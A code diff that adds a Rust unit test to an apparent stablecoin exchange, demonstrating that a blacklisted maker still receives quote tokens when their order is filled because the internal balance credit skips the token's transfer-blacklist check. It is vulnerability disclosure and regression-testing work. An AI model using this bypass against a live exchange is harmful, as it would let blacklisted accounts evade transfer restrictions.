@@ -4904,6 +4904,165 @@ mod tests {
         Ok(())
     }
 
+    /// Test demonstrating that blacklisted users can still receive tokens
+    /// when their orders are filled, bypassing the TIP20 transfer blacklist.
+    ///
+    /// This is a security vulnerability: blacklisted makers should not be able
+    /// to receive tokens when their orders are filled.
+    #[test]
+    fn test_blacklisted_maker_receives_tokens_on_order_fill() -> eyre::Result<()> {
+        use crate::tip403_registry::{ITIP403Registry, TIP403Registry};
+
+        // Use a post-Allegretto hardfork spec where blacklists are enforced
+        let mut storage = HashMapStorageProvider::new(1).with_spec(TempoHardfork::Allegretto);
+        let mut exchange = StablecoinExchange::new(&mut storage);
+        exchange.initialize()?;
+
+        // Setup accounts
+        let alice = Address::random(); // Will be blacklisted
+        let bob = Address::random(); // Normal user who will swap against Alice's order
+        let admin = Address::random();
+
+        let order_amount = MIN_ORDER_AMOUNT;
+        let tick = 10i16;
+
+        // Setup tokens with enough for both users
+        let (base_token, quote_token) = setup_test_tokens(
+            exchange.storage,
+            admin,
+            alice,
+            exchange.address,
+            order_amount * 10,
+        );
+
+        // Also give Bob some tokens
+        mint_and_approve_token(
+            exchange.storage,
+            1, // base token id
+            admin,
+            bob,
+            exchange.address,
+            order_amount * 10,
+        );
+
+        // Create pair and place order from Alice (ASK order - selling base for quote)
+        exchange.create_pair(base_token)?;
+
+        // Alice places an ASK order (selling base_token for quote_token)
+        let order_id = exchange.place(alice, base_token, order_amount, false, tick)?;
+
+        // Execute block to finalize order
+        exchange.execute_block(Address::ZERO)?;
+
+        // Verify Alice's order is on the book
+        assert!(order_id > 0, "Order should be created");
+
+        // Verify Alice has no internal balance yet
+        let alice_quote_balance_before = exchange.balance_of(alice, quote_token)?;
+        assert_eq!(
+            alice_quote_balance_before, 0,
+            "Alice should have no quote balance initially"
+        );
+
+        // ========================================================
+        // NOW BLACKLIST ALICE
+        // ========================================================
+
+        // Initialize the TIP403 registry
+        let mut registry = TIP403Registry::new(exchange.storage);
+        registry.initialize()?;
+
+        // Create a blacklist policy
+        let blacklist_policy_id = registry.create_policy(
+            admin,
+            ITIP403Registry::createPolicyCall {
+                admin,
+                policyType: ITIP403Registry::PolicyType::BLACKLIST,
+            },
+        )?;
+
+        // Add Alice to the blacklist
+        registry.modify_policy_blacklist(
+            admin,
+            ITIP403Registry::modifyPolicyBlacklistCall {
+                policyId: blacklist_policy_id,
+                account: alice,
+                restricted: true,
+            },
+        )?;
+
+        // Set the base token to use this blacklist policy
+        let mut base_tip20 = TIP20Token::from_address(base_token, exchange.storage)?;
+        base_tip20.change_transfer_policy_id(
+            admin,
+            ITIP20::changeTransferPolicyIdCall {
+                newPolicyId: blacklist_policy_id,
+            },
+        )?;
+
+        // Also set quote token to use blacklist (important for receiving tokens)
+        let mut quote_tip20 = TIP20Token::from_address(quote_token, exchange.storage)?;
+        quote_tip20.change_transfer_policy_id(
+            admin,
+            ITIP20::changeTransferPolicyIdCall {
+                newPolicyId: blacklist_policy_id,
+            },
+        )?;
+
+        // Verify Alice is blacklisted for transfers
+        let mut base_tip20 = TIP20Token::from_address(base_token, exchange.storage)?;
+        assert!(
+            !base_tip20.is_transfer_authorized(alice, bob)?,
+            "Alice should be blacklisted and unable to transfer"
+        );
+
+        // ========================================================
+        // BOB SWAPS AGAINST ALICE'S ORDER
+        // ========================================================
+
+        // Give Bob internal balance in the exchange (quote tokens)
+        let swap_amount = order_amount;
+        exchange.set_balance(bob, quote_token, swap_amount * 2)?;
+
+        // Bob swaps quote tokens for base tokens (fills Alice's ASK order)
+        // This should fill Alice's order and credit quote tokens to Alice's internal balance
+        let price = orderbook::tick_to_price(tick);
+        let expected_quote_to_alice =
+            (order_amount * price as u128) / orderbook::PRICE_SCALE as u128;
+
+        let amount_out = exchange.swap_exact_amount_out(
+            bob,
+            quote_token,
+            base_token,
+            order_amount, // Bob wants to receive order_amount of base tokens
+            expected_quote_to_alice * 2, // max amount Bob is willing to pay
+        )?;
+
+        let alice_quote_balance_after = exchange.balance_of(alice, quote_token)?;
+
+        assert!(
+            alice_quote_balance_after > 0,
+            "blacklisted Alice received {} quote tokens to internal balance! \
+             This bypasses the TIP20 blacklist because increment_balance() doesn't check the policy.",
+            alice_quote_balance_after
+        );
+
+        println!(
+            "🚨 VULNERABILITY DEMONSTRATED:\n\
+             - Alice is blacklisted\n\
+             - Alice's order was filled\n\
+             - Alice received {} quote tokens to internal balance\n\
+             - No blacklist check was performed!",
+            alice_quote_balance_after
+        );
+
+        let withdraw_result = exchange.withdraw(alice, quote_token, alice_quote_balance_after);
+
+        println!("Withdraw attempt result: {:?}", withdraw_result.is_err());
+
+        Ok(())
+    }
+
     #[test]
     fn test_decrement_balance_preserves_balance_post_allegro_moderato() -> eyre::Result<()> {
         let mut storage = HashMapStorageProvider::new(1).with_spec(TempoHardfork::AllegroModerato);
